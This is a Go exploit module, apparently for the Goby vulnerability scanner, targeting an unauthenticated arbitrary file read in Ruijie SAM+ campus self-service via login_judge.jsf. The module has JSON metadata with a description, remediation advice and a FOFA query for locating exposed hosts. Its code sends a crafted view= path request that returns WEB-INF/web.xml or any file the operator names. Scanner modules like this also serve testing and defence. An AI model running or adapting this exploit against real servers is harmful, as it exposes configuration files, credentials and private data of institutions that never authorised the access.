package exploits

import (
	"errors"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "ruijie SAM+ /login_judge.jsf File Read Vulnerability",
    "Description": "<p>Ruijie self-service campus network system is a software used to manage campus network network.Ruijie Campus Network self-service system has an arbitrary file reading vulnerability in the login_judge.jsf file. </p><p>The vulnerability allows an unauthorized attacker to read any file on the server through a specific request, and these files may contain sensitive information, such as system configuration files, database credentials, log files, and other files, putting confidential data, customer information, and other private data within the enterprise at risk.</p>",
    "Product": "ruijie SAM+",
    "Homepage": "https://www.ruijie.com.cn/fw/zxpx/87676/",
    "DisclosureDate": "2024-10-21",
    "PostTime": "2024-10-24",
    "Author": "202205566302@smail.xtu.edu.cn",
    "FofaQuery": "body=\"entry.jsp\" && (body=\"校园网自助服务系统\" || header=\"Vary: Accept-Encoding\")",
    "GobyQuery": "body=\"entry.jsp\" && (body=\"校园网自助服务系统\" || header=\"Vary: Accept-Encoding\")",
    "Level": "1",
    "Impact": "<p>The vulnerability allows an unauthorized attacker to read any file on the server through a specific request, and these files may contain sensitive information, such as system configuration files, database credentials, log files, and other files, putting confidential data, customer information, and other private data within the enterprise at risk.</p>",
    "Recommendation": "<p>1. Set access policies and whitelist access through security devices such as firewalls. </p><p>2. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://blog.csdn.net/LongL_GuYu/article/details/140174441"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "web.xml,Customize",
            "show": ""
        },
        {
            "name": "Customize",
            "type": "input",
            "value": "./WEB-INF/web.xml",
            "show": "mode=Customize"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5.0",
    "Translation": {
        "CN": {
            "Name": "锐捷校园网自助服务系统 /login_judge.jsf 文件读取漏洞",
            "Product": "锐捷校园网自助服务系统",
            "Description": "<p>锐捷自助服务校园网系统是一款用于管理校园网网络的软件。<br></p><p>锐捷校园网自助服务系统 login_judge.jsf 文件中存在任意文件读取漏洞。该漏洞允许未经授权的攻击者通过特定的请求读取服务器上的任意文件，而这些文件可能包含敏感信息，例如系统配置文件、数据库凭证、日志文件等其他文件，企业内部的机密数据、客户信息以及其他隐私数据都面临着泄露的风险。<br></p>",
            "Recommendation": "<p>1、通过防火墙等安全设备设置访问策略，设置白名单访问。&nbsp;</p><p>2、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>锐捷校园网自助服务系统 login_judge.jsf 文件中存在任意文件读取漏洞。该漏洞允许未经授权的攻击者通过特定的请求读取服务器上的任意文件，而这些文件可能包含敏感信息，例如系统配置文件、数据库凭证、日志文件等其他文件，企业内部的机密数据、客户信息以及其他隐私数据都面临着泄露的风险。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "ruijie SAM+ /login_judge.jsf File Read Vulnerability",
            "Product": "ruijie SAM+",
            "Description": "<p>Ruijie self-service campus network system is a software used to manage campus network network.Ruijie Campus Network self-service system has an arbitrary file reading vulnerability in the login_judge.jsf file.&nbsp;</p><p>The vulnerability allows an unauthorized attacker to read any file on the server through a specific request, and these files may contain sensitive information, such as system configuration files, database credentials, log files, and other files, putting confidential data, customer information, and other private data within the enterprise at risk.<br></p>",
            "Recommendation": "<p>1. Set access policies and whitelist access through security devices such as firewalls.&nbsp;</p><p>2. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>The vulnerability allows an unauthorized attacker to read any file on the server through a specific request, and these files may contain sensitive information, such as system configuration files, database credentials, log files, and other files, putting confidential data, customer information, and other private data within the enterprise at risk.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9962"
}`
	postOrGet_sacauihfhausfdasufyuasyfhwqufdwuegfyuqiyhughwdefy := func(hostInfo *httpclient.FixUrl, fileUrl string) (string, error) {
		respTxt := ""
		requestConfig := httpclient.NewGetRequestConfig("/selfservice/selfservice/module/scgroup/web/login_judge.jsf?view=" + fileUrl + "%3F")
		requestConfig.VerifyTls = false
		requestConfig.FollowRedirect = false
		resp, err := httpclient.DoHttpRequest(hostInfo, requestConfig)
		if err != nil || resp.StatusCode != 200 {
			err = errors.New("failed to read file")
			return "", err
		}
		respTxt = resp.RawBody
		// 注意：返回值为（最终要返回的读取结果，错误）
		return respTxt, nil
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 此处需要修改：设置成功后的vulurl
			vulURL := "/selfservice/selfservice/module/scgroup/web/login_judge.jsf"
			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件
			defaultModeMap := map[string]string{
				"./WEB-INF/web.xml": "ModuleConfigFile",
			}
			// 函数继承
			uploadFileFunc := postOrGet_sacauihfhausfdasufyuasyfhwqufdwuegfyuqiyhughwdefy

			// 请注意：后续代码为模板代码，非特殊情况，无需更改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			for fileUrl, fileText := range defaultModeMap {
				resp, err := uploadFileFunc(u, fileUrl)
				if err != nil {
					continue
				}
				if strings.Contains(resp, fileText) {
					// 设置VULURL
					ss.VulURL = u.HostInfo + vulURL
					return true
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var fileUrl string
			var fileText string
			mode := goutils.B2S(ss.Params["mode"])

			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件
			defaultModeMap := map[string][2]string{
				"web.xml": {"./WEB-INF/web.xml", "ModuleConfigFile"},
			}
			// 此处需要修改：函数继承
			uploadFileFunc := postOrGet_sacauihfhausfdasufyuasyfhwqufdwuegfyuqiyhughwdefy

			// 请注意，后续代码为模板固化，正常情况下均无需修改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			if mode == "Customize" {
				fileUrl = goutils.B2S(ss.Params["Customize"])
			} else {
				if _, ok := defaultModeMap[mode]; ok {
					fileUrl = defaultModeMap[mode][0]
					fileText = defaultModeMap[mode][1]
				} else {
					expResult.Success = false
					return expResult
				}
			}

			// 获取返回结果url和返回请求头
			resp, err := uploadFileFunc(expResult.HostInfo, fileUrl)
			if err != nil || (!strings.Contains(resp, fileText) && mode != "Customize") {
				expResult.Success = false
				return expResult
			}

			expResult.Success = true
			expResult.Output = resp
			return expResult
		},
	))
}
